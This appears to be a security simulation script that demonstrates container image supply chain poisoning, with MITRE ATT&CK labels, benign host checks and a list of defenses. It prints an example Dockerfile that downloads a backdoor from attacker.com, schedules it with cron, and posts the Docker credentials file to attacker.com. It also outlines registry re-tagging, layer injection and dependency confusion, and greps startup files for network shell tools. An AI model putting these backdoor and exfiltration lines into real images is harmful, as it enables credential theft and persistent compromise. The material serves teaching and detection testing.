#!/bin/bash
# Attack: Container Image Supply Chain Poisoning
# MITRE ATT&CK: Persistence - T1525, Initial Access - T1195.002
# Severity: CRITICAL
# Description: Demonstrates poisoning container images in the registry
# Prerequisites: Container registry access

set -e
echo "[+] Starting: Container Image Supply Chain Poisoning"
echo "[+] MITRE ATT&CK: T1525 - Implant Internal Image, T1195.002 - Supply Chain Compromise"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Understanding supply chain attack vectors..."
echo "[*] Attack surfaces:"
echo "    1. Base image poisoning (e.g., compromised alpine:latest)"
echo "    2. Build pipeline injection (CI/CD compromise)"
echo "    3. Registry compromise (push malicious images)"
echo "    4. Layer injection (modify image layers)"
echo "    5. Dependency confusion (malicious packages)"

echo ""
echo "[*] Step 2: Checking current image information..."
if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup 2>/dev/null; then
    echo "[+] Running in Docker container"

    # Try to determine image
    if [ -f /etc/os-release ]; then
        echo "[*] Base OS:"
        grep "PRETTY_NAME" /etc/os-release
    fi
fi

echo ""
echo "[*] Step 3: Supply chain poisoning technique - Malicious Dockerfile..."
echo "[*] Attacker modifies Dockerfile to include backdoor:"
echo ""
cat << 'EOF'
FROM alpine:latest

# Legitimate application code
COPY app/ /app/
WORKDIR /app

# MALICIOUS: Hidden backdoor installation
RUN wget -q http://attacker.com/backdoor -O /usr/local/bin/update-check && \
    chmod +x /usr/local/bin/update-check && \
    echo '*/5 * * * * /usr/local/bin/update-check' | crontab -

# MALICIOUS: Steal credentials during build
RUN if [ -f ~/.docker/config.json ]; then \
    curl -X POST http://attacker.com/exfil \
    -d "$(cat ~/.docker/config.json)"; fi

# Continue with legitimate build
RUN npm install
CMD ["node", "server.js"]
EOF

echo ""
echo "[*] Step 4: Registry poisoning technique..."
echo "[*] If attacker has registry access, they can:"
echo ""
echo "    # Build malicious image"
echo "    docker build -t internal-registry/app:latest ."
echo ""
echo "    # Tag as trusted image"
echo "    docker tag malicious-image:latest internal-registry/nginx:1.21"
echo ""
echo "    # Push to registry"
echo "    docker push internal-registry/nginx:1.21"
echo ""
echo "    # Now all deployments using nginx:1.21 are compromised!"

echo ""
echo "[*] Step 5: Layer injection attack..."
echo "[*] Attacker can inject malicious layer into existing image:"
echo ""
echo "    # Export image"
echo "    docker save trusted-image:latest > image.tar"
echo ""
echo "    # Extract and modify"
echo "    tar -xf image.tar"
echo "    echo 'malicious_payload' > malware.txt"
echo "    tar -czf layer.tar.gz malware.txt"
echo ""
echo "    # Insert malicious layer"
echo "    # Repackage and push"

echo ""
echo "[*] Step 6: Dependency confusion attack..."
echo "[*] For images using package managers:"
echo ""
echo "    # Attacker creates malicious package with same name"
echo "    # as internal package but in public registry"
echo ""
echo "    RUN pip install company-internal-lib"
echo "    # ^ Pulls from public PyPI instead of internal registry"

echo ""
echo "[*] Step 7: Demonstrating image analysis..."
echo "[*] Checking for suspicious files in current container:"
find / -name "*backdoor*" -o -name "*malware*" -o -name "*.suspicious" 2>/dev/null | head -5 || echo "[*] No obvious malicious files"

echo ""
echo "[*] Step 8: Checking for suspicious network connections..."
echo "[*] Active connections:"
if command -v netstat &> /dev/null; then
    netstat -tuln 2>/dev/null | head -10 || echo "[*] No netstat available"
elif command -v ss &> /dev/null; then
    ss -tuln 2>/dev/null | head -10 || echo "[*] No ss available"
fi

echo ""
echo "[*] Step 9: Checking for startup persistence mechanisms..."
echo "[*] Looking for suspicious startup scripts:"
for init_file in /etc/rc.local /etc/init.d/* ~/.bashrc /etc/profile.d/*; do
    if [ -f "$init_file" ]; then
        if grep -l "curl\|wget\|nc\|bash -i" "$init_file" 2>/dev/null; then
            echo "[!] Suspicious content in: $init_file"
        fi
    fi
done

echo ""
echo "[*] Step 10: Defense mechanisms..."
echo "[*] Defenses against supply chain attacks:"
echo "    1. Image signing (Docker Content Trust, Cosign)"
echo "    2. Image scanning (Trivy, Clair, Anchore)"
echo "    3. Admission controllers (OPA, Kyverno)"
echo "    4. Private registries with access control"
echo "    5. Build provenance tracking (SLSA)"
echo "    6. Software Bill of Materials (SBOM)"

echo ""
echo "[*] Step 11: Detecting compromised images..."
echo "[*] Signs of supply chain compromise:"
echo "    - Unexpected packages installed"
echo "    - Suspicious network connections during build"
echo "    - Modified base image layers"
echo "    - Unknown processes at runtime"
echo "    - Credential theft attempts"
echo "    - Outbound connections to unknown hosts"

echo ""
echo "[✓] Supply chain poisoning simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Inject backdoors into base images"
echo "    - Compromise CI/CD pipelines"
echo "    - Push malicious images to registry"
echo "    - Steal credentials during build"
echo "    - Affect all deployments using poisoned image"
echo "    - Achieve widespread persistence"
echo ""
echo "[!] Expected detections:"
echo "    - Image scanning detects malware"
echo "    - Unsigned or unverified images"
echo "    - Build-time network anomalies"
echo "    - Runtime behavior changes"
echo "    - Unexpected processes or connections"
